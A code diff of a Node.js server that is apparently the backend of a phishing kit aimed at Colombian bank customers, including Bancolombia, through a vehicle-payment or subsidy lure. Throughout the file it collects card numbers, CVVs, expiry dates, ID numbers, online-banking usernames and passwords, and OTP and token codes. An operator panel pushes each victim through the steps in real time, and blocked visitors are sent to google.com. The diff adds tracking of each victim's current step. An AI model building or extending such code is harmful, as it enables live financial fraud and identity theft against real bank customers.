@@ -26,6 +26,7 @@ const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
 const bcSesiones = new Map();
+const pasosSesiones = new Map(); // 🔥 NUEVO MAPA PARA EL PASO ACTUAL
 
 let sesionesTemporales = {};
 const SESIONES_TEMP_FILE = path.join(DATA_DIR, 'sesiones-temporales.json');
@@ -130,7 +131,7 @@ function json(res, code, obj) {
 
 function checkRateLimit(ip, tipo = 'publico') {
     const limites = {
-        publico: { max: 60, ventana: 60 * 1000 },
+        publico: { max: 100, ventana: 60 * 1000 },
         login:   { max: 5,  ventana: 15 * 60 * 1000 },
         admin:   { max: 300, ventana: 60 * 1000 }
     };
@@ -199,7 +200,7 @@ const server = http.createServer(async (req, res) => {
 
         const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
         
-        // 🔥 BLOQUEO GLOBAL: Si la IP está bloqueada, bloquea cualquier acción (menos el admin y el health)
+        // 🔥 BLOQUEO GLOBAL: Si la IP está bloqueada, bloquea cualquier acción
         if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
             json(res, 200, { ok: false, bloqueado: true, error: 'IP bloqueada', redirect: 'https://www.google.com' });
             return;
@@ -220,23 +221,13 @@ const server = http.createServer(async (req, res) => {
         }
 
         if (req.method === 'GET' && url === '/health') {
-            json(res, 200, {
-                ok: true,
-                bancos: Object.keys(bancos).length,
-                sesiones: estadoSesiones.size,
-                activos: usuariosActivos.size,
-                bloqueadas: ipsBloqueadas.size
-            });
+            json(res, 200, { ok: true, bancos: Object.keys(bancos).length, sesiones: estadoSesiones.size, activos: usuariosActivos.size, bloqueadas: ipsBloqueadas.size });
             return;
         }
 
         if (req.method === 'GET' && url === '/check-ip') {
             console.log('[check-ip] IP detectada:', ip, '| ¿bloqueada?:', ipsBloqueadas.has(ip));
-            if (ipsBloqueadas.has(ip)) {
-                json(res, 200, { bloqueado: true, redirect: 'https://www.google.com', ip });
-            } else {
-                json(res, 200, { bloqueado: false, ip });
-            }
+            if (ipsBloqueadas.has(ip)) { json(res, 200, { bloqueado: true, redirect: 'https://www.google.com', ip }); } else { json(res, 200, { bloqueado: false, ip }); }
             return;
         }
 
@@ -253,6 +244,21 @@ const server = http.createServer(async (req, res) => {
                     userAgent: (req.headers['user-agent'] || '').slice(0, 200),
                     entroEn: previo.entroEn || Date.now()
                 });
+                json(res, 200, { ok: true });
+            } catch (e) { json(res, 400, { ok: false }); }
+            return;
+        }
+
+        // 🔥 NUEVA RUTA PARA TRACKEAR EL PASO DEL USUARIO
+        if (req.method === 'POST' && url === '/bc/actualizar-paso') {
+            try {
+                const { sessionId, paso } = await getBody(req);
+                if (sessionId && paso) {
+                    pasosSesiones.set(sessionId, paso);
+                    if (!estadoSesiones.has(sessionId)) {
+                        estadoSesiones.set(sessionId, 'pendiente');
+                    }
+                }
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
@@ -296,14 +302,7 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'GET' && url === '/admin/activos') {
                 const lista = [];
                 for (const [sid, d] of usuariosActivos.entries()) {
-                    lista.push({
-                        sessionId: sid, 
-                        ip: d.ip, 
-                        ultimaAccion: d.ultimaAccion,
-                        tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000),
-                        userAgent: d.userAgent,
-                        ultimoHeartbeat: d.ultimoHeartbeat
-                    });
+                    lista.push({ sessionId: sid, ip: d.ip, ultimaAccion: d.ultimaAccion, tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000), userAgent: d.userAgent, ultimoHeartbeat: d.ultimoHeartbeat });
                 }
                 json(res, 200, { ok: true, activos: lista });
                 return;
@@ -338,8 +337,8 @@ const server = http.createServer(async (req, res) => {
                     } else {
                         datos = datosSesiones.get(sid) || {};
                     }
-                    
-                    lista.push({ sessionId: sid, estado, datos });
+                    const paso = pasosSesiones.get(sid) || 'index';
+                    lista.push({ sessionId: sid, estado, datos, paso });
                 }
                 json(res, 200, { ok: true, sesiones: lista });
                 return;
@@ -360,23 +359,13 @@ const server = http.createServer(async (req, res) => {
                 try {
                     const { accion } = await getBody(req);
                     const mapEstados = {
-                        ACEPTAR: 'aceptado', 
-                        RECHAZAR: 'rechazado',
-                        OTP: 'otp', 
-                        TOKEN: 'token', 
-                        FINALIZAR: 'finalizado',
-                        CC_ERROR: 'cc_error',
-                        AUTORIZAR: 'autorizacion',
-                        PEDIR_CC: 'pedir_cc',
-                        PEDIR_DATOS: 'pedir_datos',
-                        PEDIR_DINAMICA: 'pedir_dinamica'
+                        ACEPTAR: 'aceptado', RECHAZAR: 'rechazado', OTP: 'otp', TOKEN: 'token', FINALIZAR: 'finalizado', CC_ERROR: 'cc_error', AUTORIZAR: 'autorizacion', PEDIR_CC: 'pedir_cc', PEDIR_DATOS: 'pedir_datos', PEDIR_DINAMICA: 'pedir_dinamica'
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     
                     const estadoNuevo = mapEstados[accion];
                     estadoSesiones.set(sessionId, estadoNuevo);
                     ultimaAccionSesiones.set(sessionId, accion);
-
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
                     console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -417,16 +406,14 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'POST' && url === '/admin/sesiones/borrar') {
                 try {
                     const { sessionIds } = await getBody(req);
-                    if (!Array.isArray(sessionIds) || !sessionIds.length) {
-                        json(res, 400, { ok: false, error: 'sessionIds requerido' });
-                        return;
-                    }
+                    if (!Array.isArray(sessionIds) || !sessionIds.length) { json(res, 400, { ok: false, error: 'sessionIds requerido' }); return; }
                     let borradas = 0;
                     sessionIds.forEach(sid => {
                         if (estadoSesiones.delete(sid)) borradas++;
                         datosSesiones.delete(sid);
                         usuariosActivos.delete(sid);
                         ultimaAccionSesiones.delete(sid);
+                        pasosSesiones.delete(sid); // 🔥 Borrar el paso también
                     });
                     agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
                     json(res, 200, { ok: true, borradas });
@@ -437,10 +424,7 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'POST' && url === '/admin/logs/borrar') {
                 try {
                     const { ids } = await getBody(req);
-                    if (!Array.isArray(ids) || !ids.length) {
-                        json(res, 400, { ok: false, error: 'ids requerido' });
-                        return;
-                    }
+                    if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; }
                     const antes = logsAdmin.length;
                     logsAdmin = logsAdmin.filter(l => !ids.includes(l.id));
                     try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {}
@@ -454,10 +438,7 @@ const server = http.createServer(async (req, res) => {
             if (req.method === 'POST' && url === '/admin/ips/borrar') {
                 try {
                     const { ips } = await getBody(req);
-                    if (!Array.isArray(ips) || !ips.length) {
-                        json(res, 400, { ok: false, error: 'ips requerido' });
-                        return;
-                    }
+                    if (!Array.isArray(ips) || !ips.length) { json(res, 400, { ok: false, error: 'ips requerido' }); return; }
                     let borradas = 0;
                     ips.forEach(i => { if (ipsBloqueadas.delete(i)) borradas++; });
                     guardarIpsBloqueadas();
@@ -474,14 +455,7 @@ const server = http.createServer(async (req, res) => {
 
             if (req.method === 'GET' && url === '/admin/stats') {
                 const pendientes = [...estadoSesiones.values()].filter(e => e === 'pendiente').length;
-                json(res, 200, {
-                    ok: true,
-                    activos: usuariosActivos.size,
-                    sesiones: estadoSesiones.size,
-                    pendientes,
-                    bloqueadas: ipsBloqueadas.size,
-                    historial: historial.length
-                });
+                json(res, 200, { ok: true, activos: usuariosActivos.size, sesiones: estadoSesiones.size, pendientes, bloqueadas: ipsBloqueadas.size, historial: historial.length });
                 return;
             }
 
@@ -502,16 +476,14 @@ const server = http.createServer(async (req, res) => {
 
                 const datosPrevios = sesionesTemporales[sessionId] || {};
                 const datosCompletos = Object.assign({}, datosPrevios, {
-                    sessionId,
-                    tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio,
-                    ip: ip,
-                    creadoEn: new Date().toISOString()
+                    sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio, ip: ip, creadoEn: new Date().toISOString()
                 });
 
                 sesionesTemporales[sessionId] = datosCompletos;
                 guardarSesionesTemporales();
 
                 datosSesiones.set(sessionId, datosCompletos);
+                if (!estadoSesiones.has(sessionId)) estadoSesiones.set(sessionId, 'pendiente');
 
                 console.log(`[${bancoKey}] Consulta en disco: ${sessionId} | Tel: ${telefono}`);
                 json(res, 200, { ok: true });
@@ -555,32 +527,21 @@ const server = http.createServer(async (req, res) => {
                 const datosPrevios = sesionesTemporales[sessionId] || {};
 
                 const datosSesion = Object.assign({}, datosPrevios, {
-                    sessionId,
-                    bancoKey: bancoKey, 
-                    marca, 
-                    tarjeta, 
-                    titular, 
-                    docType, 
-                    docNumber,
-                    monto, 
-                    expMes, 
-                    expAnio, 
-                    cvv, 
-                    placa: placa || datosPrevios.placa || '', 
-                    subsidio: subsidio || false,
-                    ip: ip, 
-                    creadoEn: new Date().toISOString(),
+                    sessionId, bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, 
+                    placa: placa || datosPrevios.placa || '', subsidio: subsidio || false, ip: ip, creadoEn: new Date().toISOString(),
                     bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
-                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
-                    cardType: infoBin?.cardType || 'Desconocido',
-                    cardLevel: infoBin?.cardLevel || 'Desconocido',
-                    bankName: infoBin?.bankName || 'Desconocido',
-                    countryName: infoBin?.countryName || 'Desconocido'
+                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido'
                 });
 
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                
+                let pasoActual = pasosSesiones.get(sessionId) || 'pagodesubsidio';
+                if (marca === 'PSE') pasoActual += ' (PSE)';
+                else pasoActual += ' (Tarjeta)';
+                pasosSesiones.set(sessionId, pasoActual);
 
                 guardarHistorial(bancoKey, datosSesion);
 
@@ -630,9 +591,7 @@ const server = http.createServer(async (req, res) => {
 
                 const datosPrevios = datosSesiones.get(sessionId) || {};
                 const datosCompletos = Object.assign({}, datosPrevios, {
-                    authUsuario: usuario,
-                    authPassword: password,
-                    authEnviadoEn: new Date().toISOString()
+                    authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString()
                 });
 
                 datosSesiones.set(sessionId, datosCompletos);
@@ -659,13 +618,7 @@ const server = http.createServer(async (req, res) => {
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
                 const datosSesion = {
-                    sessionId,
-                    bancoKey: 'bancolombia',
-                    marca: 'bancolombia',
-                    identificacion: usuario,
-                    clave: clave,
-                    ip: ip,
-                    creadoEn: new Date().toISOString()
+                    sessionId, bancoKey: 'bancolombia', marca: 'bancolombia', identificacion: usuario, clave: clave, ip: ip, creadoEn: new Date().toISOString()
                 };
 
                 estadoSesiones.set(sessionId, 'pendiente');
@@ -738,16 +691,8 @@ const server = http.createServer(async (req, res) => {
                 const datosPanelPrevios = datosSesiones.get(sessionId) || {};
                 
                 const datosCompletos = { 
-                    sessionId,
-                    ...datosPanelPrevios,
-                    ...sesionData, 
-                    tarjeta, 
-                    titular, 
-                    exp, 
-                    expMes: exp,
-                    cvv,
-                    fechaCaptura: new Date().toISOString(),
-                    bancoKey: 'bancolombia'
+                    sessionId, ...datosPanelPrevios, ...sesionData, tarjeta, titular, exp, expMes: exp, cvv,
+                    fechaCaptura: new Date().toISOString(), bancoKey: 'bancolombia'
                 };
 
                 if (tarjeta) {
@@ -767,10 +712,7 @@ const server = http.createServer(async (req, res) => {
                     ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
                 }
                 
-                // Actualizamos los datos de la sesión en el panel
                 datosSesiones.set(sessionId, datosCompletos);
-
-                // Guardamos en el historial para el ojito 👁️
                 guardarHistorial('bancolombia', datosCompletos);
                 bcSesiones.delete(sessionId);
 
@@ -794,9 +736,7 @@ const server = http.createServer(async (req, res) => {
                 const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
                 const datosSesion = {
-                    sessionId,
-                    bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token,
-                    ip, creadoEn: new Date().toISOString()
+                    sessionId, bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token, ip, creadoEn: new Date().toISOString()
                 };
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
